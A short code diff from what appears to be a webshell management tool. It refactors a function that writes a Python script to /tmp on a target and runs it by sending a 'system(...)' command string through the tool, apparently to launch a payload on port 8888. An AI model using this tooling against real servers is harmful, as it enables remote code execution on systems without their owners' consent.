@@ -1,5 +1,5 @@
 from libs.config import alias, color
-from libs.myapp import send, delay_send, is_windows, has_env
+from libs.myapp import send, delay_send, is_windows, has_env, get_system_code
 from threading import Thread
 from time import sleep
 from base64 import b64encode
@@ -111,7 +111,7 @@ def run(port: int = 8888):
         if not len(text):
             print(color.red("Failed to write file in /tmp directory."))
             return
-        t = Thread(target=send, args=(f"system('python /tmp/{pyname}');",))
+        t = Thread(target=send, args=(get_system_code(f"python /tmp/{pyname}"),))
         t.setDaemon(True)
         t.start()
         t2 = Thread(
